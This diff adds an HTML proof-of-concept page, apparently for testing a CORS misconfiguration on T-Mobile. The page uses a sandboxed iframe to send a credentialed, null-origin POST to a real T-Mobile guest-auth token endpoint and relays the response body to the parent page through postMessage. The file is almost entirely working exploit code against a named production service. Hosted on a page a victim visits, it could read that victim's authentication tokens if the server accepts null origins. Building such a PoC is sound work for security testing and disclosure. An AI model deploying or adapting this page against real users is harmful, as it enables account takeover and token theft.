@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>T-Mobile Advanced PoC</title>
+    <style>
+        body { font-family: sans-serif; padding: 40px; background: #f0f0f0; }
+        .box { max-width: 750px; margin: auto; background: white; padding: 30px; border-radius: 10px; border: 3px solid #e20074; }
+        #runBtn { background: #e20074; color: white; padding: 15px; width: 100%; border: none; cursor: pointer; font-weight: bold; }
+        #output { margin-top: 20px; background: #222; color: #4af626; padding: 15px; min-height: 100px; font-family: monospace; white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h1>Advanced CORS Test (Null Origin)</h1>
+    <p>This test uses a sandboxed iframe to send a <code>null</code> origin.</p>
+    
+    <button id="runBtn">FIRE NULL ORIGIN REQUEST</button>
+    <div id="output">Results will appear here...</div>
+</div>
+
+<iframe id="sandbox" sandbox="allow-scripts" style="display:none;"></iframe>
+
+<script>
+    var btn = document.getElementById('runBtn');
+    var output = document.getElementById('output');
+    var frame = document.getElementById('sandbox');
+
+    btn.onclick = function() {
+        output.innerText = "Triggering request from sandboxed iframe...";
+        
+        // This script runs INSIDE the iframe with a 'null' origin
+        var code = `
+            <script>
+                fetch('https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens', {
+                    method: 'POST',
+                    mode: 'cors',
+                    credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({})
+                })
+                .then(r => r.text().then(t => window.parent.postMessage({s: r.status, b: t}, '*')))
+                .catch(e => window.parent.postMessage({err: e.message}, '*'));
+            <\/script>
+        `;
+        
+        frame.srcdoc = code;
+    };
+
+    // Listen for the result from the iframe
+    window.addEventListener('message', function(event) {
+        if (event.data.err) {
+            output.innerText = "Result: " + event.data.err;
+        } else {
+            output.innerText = "Status: " + event.data.s + "\n\nBody: " + event.data.b;
+        }
+    });
+</script>
+
+</body>
+</html>
